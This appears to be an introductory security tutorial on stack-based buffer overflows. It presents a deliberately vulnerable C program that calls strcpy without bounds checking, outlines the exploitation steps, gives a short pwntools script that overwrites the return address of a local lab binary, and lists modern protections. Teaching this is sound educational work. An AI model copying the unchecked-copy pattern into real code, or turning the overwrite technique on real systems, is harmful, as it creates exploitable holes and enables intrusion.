Stack-Based Buffer Overflow Fundamentals

Buffer overflows remain one of the most fundamental vulnerability classes in binary exploitation. Understanding stack-based overflows is essential for any security researcher working with low-level systems.

The Stack Layout

The program stack grows downward in memory, containing local variables, function parameters, and return addresses.

Vulnerable Code Example

#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    vulnerable_function(argv[1]);
    return 0;
}

Exploitation Process

  1. Crash Analysis: Determine offset to return address
  2. Bad Character Detection: Find characters that break the exploit
  3. Return Address Control: Overwrite with target address
  4. Payload Execution: Execute shellcode or ROP chain

Basic Exploit Script

#!/usr/bin/env python3
from pwn import *

# Find offset to return address
offset = 72

# Build payload
payload = b'A' * offset
payload += p64(0x40118a)  # Return address

# Send payload
p = process('./vulnerable')
p.sendline(payload)
p.interactive()

Modern Protections

  • ASLR: Randomizes memory layout
  • DEP/NX: Prevents code execution on stack
  • Stack Canaries: Detect stack corruption
  • FORTIFY_SOURCE: Enhanced bounds checking

This covers the absolute basics. Real-world exploitation involves bypassing these protections.
